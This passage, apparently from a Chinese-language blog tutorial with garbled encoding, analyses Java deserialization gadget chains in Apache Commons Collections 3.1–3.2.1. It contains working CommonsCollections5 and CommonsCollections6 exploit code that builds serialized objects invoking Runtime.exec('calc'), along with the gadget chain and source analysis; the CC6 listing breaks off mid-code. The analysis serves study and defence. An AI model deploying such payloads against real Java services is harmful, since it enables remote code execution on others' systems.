</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.io.ObjectInputStream</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.io.ObjectOutputStream</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.Field</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.util.HashMap</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>CommonsCollections5</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Transformer</span><span class=w> </span><span class=n>Testtransformer</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ChainedTransformer</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>Transformer</span><span class=o>[]</span><span class=p>{});</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Transformer</span><span class=o>[]</span><span class=w> </span><span class=n>transformers</span><span class=o>=</span><span class=k>new</span><span class=w> </span><span class=n>Transformer</span><span class=o>[]</span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>new</span><span class=w> </span><span class=n>ConstantTransformer</span><span class=p>(</span><span class=n>Runtime</span><span class=p>.</span><span class=na>class</span><span class=p>),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>new</span><span class=w> </span><span class=n>InvokerTransformer</span><span class=p>(</span><span class=s>&#34;getMethod&#34;</span><span class=p>,</span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=p>{</span><span class=n>String</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=n>Class</span><span class=o>[]</span><span class=p>.</span><span class=na>class</span><span class=p>},</span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=p>{</span><span class=s>&#34;getRuntime&#34;</span><span class=p>,</span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=p>{}}),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>new</span><span class=w> </span><span class=n>InvokerTransformer</span><span class=p>(</span><span class=s>&#34;invoke&#34;</span><span class=p>,</span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=p>{</span><span class=n>Object</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=n>Object</span><span class=o>[]</span><span class=p>.</span><span class=na>class</span><span class=p>},</span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=p>{</span><span class=kc>null</span><span class=p>,</span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=p>{}}),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>new</span><span class=w> </span><span class=n>InvokerTransformer</span><span class=p>(</span><span class=s>&#34;exec&#34;</span><span class=p>,</span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=p>{</span><span class=n>String</span><span class=p>.</span><span class=na>class</span><span class=p>},</span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=p>{</span><span class=s>&#34;calc&#34;</span><span class=p>})</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>HashMap</span><span class=w> </span><span class=n>innermap</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>HashMap</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>LazyMap</span><span class=w> </span><span class=n>map</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>LazyMap</span><span class=p>)</span><span class=n>LazyMap</span><span class=p>.</span><span class=na>decorate</span><span class=p>(</span><span class=n>innermap</span><span class=p>,</span><span class=n>Testtransformer</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>TiedMapEntry</span><span class=w> </span><span class=n>tiedmap</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>TiedMapEntry</span><span class=p>(</span><span class=n>map</span><span class=p>,</span><span class=n>123</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>BadAttributeValueExpException</span><span class=w> </span><span class=n>poc</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>BadAttributeValueExpException</span><span class=p>(</span><span class=n>123</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Field</span><span class=w> </span><span class=n>val</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Class</span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=s>&#34;javax.management.BadAttributeValueExpException&#34;</span><span class=p>).</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=s>&#34;val&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>val</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>val</span><span class=p>.</span><span class=na>set</span><span class=p>(</span><span class=n>poc</span><span class=p>,</span><span class=n>tiedmap</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Field</span><span class=w> </span><span class=n>field</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ChainedTransformer</span><span class=p>.</span><span class=na>class</span><span class=p>.</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=s>&#34;iTransformers&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>field</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>field</span><span class=p>.</span><span class=na>set</span><span class=p>(</span><span class=n>Testtransformer</span><span class=p>,</span><span class=w> </span><span class=n>transformers</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ObjectOutputStream</span><span class=w> </span><span class=n>outputStream</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ObjectOutputStream</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>FileOutputStream</span><span class=p>(</span><span class=s>&#34;cc5.out&#34;</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>outputStream</span><span class=p>.</span><span class=na>writeObject</span><span class=p>(</span><span class=n>poc</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>outputStream</span><span class=p>.</span><span class=na>close</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ObjectInputStream</span><span class=w> </span><span class=n>inputStream</span><span class=o>=</span><span class=k>new</span><span class=w> </span><span class=n>ObjectInputStream</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>FileInputStream</span><span class=p>(</span><span class=s>&#34;cc5.out&#34;</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>inputStream</span><span class=p>.</span><span class=na>readObject</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h3 id=expæ„é€ åˆ†æ-6>Expæ„é€ åˆ†æ</h3><h4 id=åˆ©ç”¨é“¾å±•ç¤º-4>åˆ©ç”¨é“¾å±•ç¤º</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>Gadget</span><span class=w> </span><span class=n>chain</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>ObjectInputStream</span><span class=p>.</span><span class=na>readObject</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=n>BadAttributeValueExpException</span><span class=p>.</span><span class=na>readObject</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>				</span><span class=n>TiedMapEntry</span><span class=p>.</span><span class=na>toString</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>					</span><span class=n>LazyMap</span><span class=p>.</span><span class=na>get</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>						</span><span class=n>ChainedTransformer</span><span class=p>.</span><span class=na>transform</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    		</span><span class=n>ConstantTransformer</span><span class=p>.</span><span class=na>transform</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>								</span><span class=n>InvokerTransformer</span><span class=p>.</span><span class=na>transform</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>									</span><span class=n>Method</span><span class=p>.</span><span class=na>invoke</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>										</span><span class=n>Runtime</span><span class=p>.</span><span class=na>exec</span><span class=p>()</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h4 id=badattributevalueexpexception>BadAttributeValueExpException</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>readObject</span><span class=p>(</span><span class=n>ObjectInputStream</span><span class=w> </span><span class=n>ois</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>IOException</span><span class=p>,</span><span class=w> </span><span class=n>ClassNotFoundException</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ObjectInputStream</span><span class=p>.</span><span class=na>GetField</span><span class=w> </span><span class=n>gf</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ois</span><span class=p>.</span><span class=na>readFields</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Object</span><span class=w> </span><span class=n>valObj</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>gf</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=s>&#34;val&#34;</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>valObj</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>val</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>valObj</span><span class=w> </span><span class=k>instanceof</span><span class=w> </span><span class=n>String</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>val</span><span class=o>=</span><span class=w> </span><span class=n>valObj</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>System</span><span class=p>.</span><span class=na>getSecurityManager</span><span class=p>()</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=o>||</span><span class=w> </span><span class=n>valObj</span><span class=w> </span><span class=k>instanceof</span><span class=w> </span><span class=n>Long</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=o>||</span><span class=w> </span><span class=n>valObj</span><span class=w> </span><span class=k>instanceof</span><span class=w> </span><span class=n>Integer</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=o>||</span><span class=w> </span><span class=n>valObj</span><span class=w> </span><span class=k>instanceof</span><span class=w> </span><span class=n>Float</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=o>||</span><span class=w> </span><span class=n>valObj</span><span class=w> </span><span class=k>instanceof</span><span class=w> </span><span class=n>Double</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=o>||</span><span class=w> </span><span class=n>valObj</span><span class=w> </span><span class=k>instanceof</span><span class=w> </span><span class=n>Byte</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=o>||</span><span class=w> </span><span class=n>valObj</span><span class=w> </span><span class=k>instanceof</span><span class=w> </span><span class=n>Short</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=o>||</span><span class=w> </span><span class=n>valObj</span><span class=w> </span><span class=k>instanceof</span><span class=w> </span><span class=n>Boolean</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>val</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>valObj</span><span class=p>.</span><span class=na>toString</span><span class=p>();</span><span class=c1>//1</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=c1>// the serialized object is from a version without JDK-8019292 fix</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>val</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>System</span><span class=p>.</span><span class=na>identityHashCode</span><span class=p>(</span><span class=n>valObj</span><span class=p>)</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;@&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>valObj</span><span class=p>.</span><span class=na>getClass</span><span class=p>().</span><span class=na>getName</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>åˆ†æä¸€ä¸‹BadAttributeValueExpException.readObject()æºç ï¼Œå› ä¸ºSecurityManageræ˜¯é»˜è®¤å…³é—­çš„ï¼Œå› æ­¤<code>System.getSecurityManager() == null</code>â€‹ä¸ºçœŸï¼Œç¨‹åºä¼šæ‰§è¡Œæ³¨é‡Š1å¤„ã€‚</p><p>åˆ†æExpï¼Œè¿™é‡Œä¼šè§¦å‘TiedMapEntry.toString()ã€‚</p><h4 id=tiedmapentry>TiedMapEntry</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=kd>public</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=nf>toString</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>getKey</span><span class=p>()</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;=&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>getValue</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=kd>public</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=nf>getValue</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>map</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=na>key</span><span class=p>);</span><span class=c1>//1</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>ç¨‹åºåœ¨æ³¨é‡Š1å¤„ä¼šè§¦å‘LazyMap.get()ï¼Œåç»­çš„æ‰§è¡Œæµç¨‹åˆ™å’ŒCommonsCollections1ç›¸åŒã€‚</p><h2 id=commonscollections6>CommonsCollections6</h2><h3 id=ç‰ˆæœ¬é€‚ç”¨èŒƒå›´-5>ç‰ˆæœ¬é€‚ç”¨èŒƒå›´</h3><p>commons-collections : 3.1ï½3.2.1</p><h3 id=expå±•ç¤º-6>Expå±•ç¤º</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.Transformer</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.functors.ChainedTransformer</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.functors.ConstantTransformer</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.functors.InvokerTransformer</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.map.LazyMap</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.keyvalue.TiedMapEntry</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.io.*</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.Field</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.util.HashMap</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.util.HashSet</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.util.Map</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>CommonsCollections6</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>NoSuchFieldException</span><span class=p>,</span><span class=w> </span><span class=n>IllegalAccessException</span><span class=p>,</span><span class=w> </span><span class=n>IOException</span><span class=p>,</span><span class=w> </span><span class=n>ClassNotFoundException</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Transformer</span><span class=w> </span><span class=n>Testtransformer</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ChainedTransformer</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>Transformer</span><span class=o>[]</span><span class=p>{});</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Transformer</span><span class=o>[]</span><span class=w> </span><span class=n>transformers</span><span class=o>=</span><span class=k>new</span><span class=w> </span><span class=n>Transformer</span><span class=o>[]</span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>new</span><span class=w> </span><span class=n>ConstantTransformer</span><span class=p>(</span><span class=n>Runtime</span><span class=p>.</span><span class=na>class</span><span class=p>),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>new</span><span class=w> </span><span class=n>InvokerTransformer</span><span class=p>(</span><span class=s>&#34;getMethod&#34;</span><span class=p>,</span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=p>{</span><span class=n>String</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=n>Class</span><span class=o>[]</span><span class=p>.</span><span class=na>class</span><span class=p>},</span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=p>{</span><span class=s>&#34;getRuntime&#34;</span><span class=p>,</span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=p>{}}),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>new</span><span class=w> </span><span class=n>InvokerTransformer</span><span class=p>(</span><span class=s>&#34;invoke&#34;</span><span class=p>,</span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=p>{</span><span class=n>Object</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=n>Object</span><span class=o>[]</span><span class=p>.</span><span class=na>class</span><span class=p>},</span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=p>{</span><span class=kc>null</span><span class=p>,</span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=p>{}}),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>new</span><span class=w> </span><span class=n>InvokerTransformer</span><span class=p>(</span><span class=s>&#34;exec&#34;</span><span class=p>,</span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=p>{</span><span class=n>String</span><span class=p>.</span><span class=na>class</span><span class=p>},</span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=p>{</span><span class=s>&#34;calc&#34;</span><span class=p>})</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Map</span><span class=w> </span><span class=n>map</span><span class=o>=</span><span class=k>new</span><span class=w> </span><span class=n>HashMap</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Map</span><span class=w> </span><span class=n>lazyMap</span><span class=o>=</span><span class=n>LazyMap</span><span class=p>.</span><span class=na>decorate</span><span class=p>(</span><span class=n>map</span><span class=p>,</span><span class=n>Testtransformer</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>TiedMapEntry</span><span class=w> </span><span class=n>tiedMapEntry</span><span class=o>=</span><span class=k>new</span><span class=w> </span><span class=n>TiedMapEntry</span><span class=p>(</span><span class=n>lazyMap</span><span class=p>,</span><span class=s>&#34;cc6&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>HashSet</span><span class=w> </span><span class=n>hashSet</span><span class=o>=</span><span class=k>new</span><span class=w> </span><span class=n>HashSet</span><span class=p>(</span><span class=n>1</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>hashSet</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=n>tiedMapEntry</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>lazyMap</span><span class=p>.</span><span class=na>remove</span><span class=p>(</span><span class=s>&#34;cc6&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>//é€šè¿‡åå°„è¦†ç›–åŸæœ¬çš„iTransformersï¼Œé˜²æ­¢åºåˆ—åŒ–æ—¶åœ¨æœ¬åœ°æ‰§è¡Œå‘½ä»¤</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Field</span><span class=w> </span><span class=n>field</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ChainedTransformer</span><span class=p>.</span><span class=na>class</span><span class=p>.</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=s>&#34;iTransformers&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>field</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>field</span><span class=p>.</span><span class=na>set</span><span class=p>(</span><span class=n>Testtransformer</span><span class=p>,</span><span class=w> </span><span class=n>transformers</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ObjectOutputStream</span><span class=w> </span><span class=n>objectOutputStream</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ObjectOutputStream</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>FileOutputStream</span><span class=p>(</span><span class=s>&#34;cc6.out&#34;</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>objectOutputStream</span><span class=p>.</span><span class=na>writeObject</span><span class=p>(</span><span class=n>hashSet</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>objectOutputStream</span><span class=p>.</span><span class=na>close</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
